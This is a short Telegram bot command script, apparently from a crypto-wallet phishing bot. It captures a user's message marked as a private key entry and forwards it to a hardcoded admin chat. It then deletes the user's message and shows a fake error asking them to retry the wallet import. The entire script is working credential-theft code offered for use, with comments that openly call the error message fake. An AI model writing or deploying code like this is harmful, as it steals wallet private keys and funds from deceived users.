/*CMD
  command: /send_message
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

// Capture user response and forward it to the admin
var adminID = "7377411824";  // Replace with actual admin ID

// Check if bot is expecting input
var awaiting = Bot.getProperty("awaiting_wallet_" + user.telegramid);

if (awaiting === "importkey") {
  // Forward user message to admin
  Api.sendMessage({
    chat_id: adminID,
    text: "<b>🚨 New Private Key Entry from User:</b>\n\n<code>" + message + "</code>",
    parse_mode: "html",
    reply_markup: {
      inline_keyboard: [[{ text: "💬 Reply to User", callback_data: "/reply_user " + user.telegramid }]]
    }
  });

  // ✅ Check if request.message exists before deleting
  if (request.message) {
    Api.deleteMessage({
      chat_id: user.telegramid,
      message_id: request.message.message_id
    });
  }

  // Send fake error message
  Api.sendMessage({
    text: "<b>❌ ERROR DETECTED! CONNECT AN ACTIVE WALLET.</b>",
    parse_mode: "html",
    reply_markup: {
      inline_keyboard: [[{ text: "🔄 Retry", callback_data: "/importwallet" }]]
    }
  });

  // Clear awaiting state
  Bot.setProperty("awaiting_wallet_" + user.telegramid, null, "string");
}
